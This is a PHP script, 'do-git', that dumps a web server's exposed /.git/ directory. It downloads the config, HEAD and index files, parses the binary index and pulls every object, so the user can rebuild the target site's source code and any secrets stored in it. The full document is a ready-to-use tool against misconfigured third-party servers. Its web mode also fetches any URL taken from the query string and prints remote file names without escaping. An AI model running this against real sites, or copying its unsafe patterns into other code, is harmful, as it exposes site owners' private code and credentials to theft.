<?php
/**
 * Downloader Git Folder v0.0.0.2 (do-git)
 * CLI && WEB version
 *
 * @description Downloader /.git/ (folder/files) repository without --bare
 * @author 5ms.ru
 * @link https://github.com/5ms/do-git
 * @date 16.11.2015
 */

set_time_limit(0);

if (PHP_SAPI == 'cli') {
	$usage = 'usage: php ' . basename($_SERVER['PHP_SELF']) . ' -u http://target/.git/ -l';
	$opt = getopt("u:l");
	$nl = PHP_EOL;
} else {
	$usage = 'usage: ' . $_SERVER['PHP_SELF'] . '?u=http://target/.git/&l';
	$opt = $_GET;
	$nl = '<br/>';
}

if (empty($opt['u'])
	|| !filter_var($opt['u'], FILTER_VALIDATE_URL)
	|| !($data = parse_url($opt['u']))
	|| empty($data['host'])) {
	exit($usage);
}

if (substr($opt['u'], -1) != '/') {
	$opt['u'] .= '/';
}
$url = $opt['u'];

$log = isset($opt['l']);

$structure = array(
	'' => array(
		'index',        // not empty repository
		'config',
		'description',
		'HEAD',
	),
	'logs/' => array(
		'HEAD',
	),
	'objects/' => array(

	),
);

$dir = './' . $data['host'] . '/';
foreach ($structure as $path => $file) {
	if (!is_dir($dir . $path)) {
		mkdir($dir . $path, 0777);
		chmod($dir . $path, 0777);
	}
	if (!empty($file)) {
		for ($i = 0, $ic = count($file); $i < $ic; $i++) {
			if (!$data = @file_get_contents($url . $path . $file[$i])) {
				exit('no .git');
			}
			file_put_contents($dir . $path . $file[$i], $data);
		}
	}
}

$size = filesize($dir . 'index');
$fn = fopen($dir . 'index', 'r');

if (!($signature = fread($fn, 4)) || $signature != 'DIRC') {
	exit('.git index is corrupted');
}

$version  = fread($fn, 4);
$entries  = fread($fn, 4);
$complete = 0;
$failure  = 0;

while (!feof($fn) && $size - ftell($fn) >= 64) {

	$null = fread($fn, 4);  // ctime seconds
	if ($null == 'TREE') {
		break;
	}

	$null = fread($fn, 4);  // ctime nanosecond
	$null = fread($fn, 4);  // mtime seconds
	$null = fread($fn, 4);  // mtime nanosecond
	$null = fread($fn, 4);  // dev
	$null = fread($fn, 4);  // ino
	$null = fread($fn, 4);  // mode
	$null = fread($fn, 4);  // uid
	$null = fread($fn, 4);  // gid
	$null = fread($fn, 4);  // file size

	$subdir = fread($fn, 1);

	$get = $url . 'objects/' . bin2hex($subdir) . '/';
	$target = $dir . 'objects/' . bin2hex($subdir) . '/';

	if (!is_dir($target)) {
		mkdir($target, 0777);
		chmod($target, 0777);
	}

	$file     = bin2hex(fread($fn, 19));
	$null     = fread($fn, 1);
	$length   = fread($fn, 1);
	$original = fread($fn, hexdec(bin2hex($length)));

	$null = fread($fn, 8 - (40 + 1 + 19 + 1 + 1 + hexdec(bin2hex($length))) % 8); // padding block

	$get .= $file;
	$target .= $file;

	if ($data = @file_get_contents($get)) {
		file_put_contents($target, $data);
		$complete++;
	} else {
		$failure++;
		if ($log) {
			echo '[FAIL!] - ' . $nl;
		}
	}

	if ($log) {
		echo $original . ' - ' . $get . '' . $nl;
	}
}

fclose($fn);

echo 'complete: ' . $complete . $nl;
if ($failure > 0) {
	echo 'failure: ' . $failure . $nl;
}
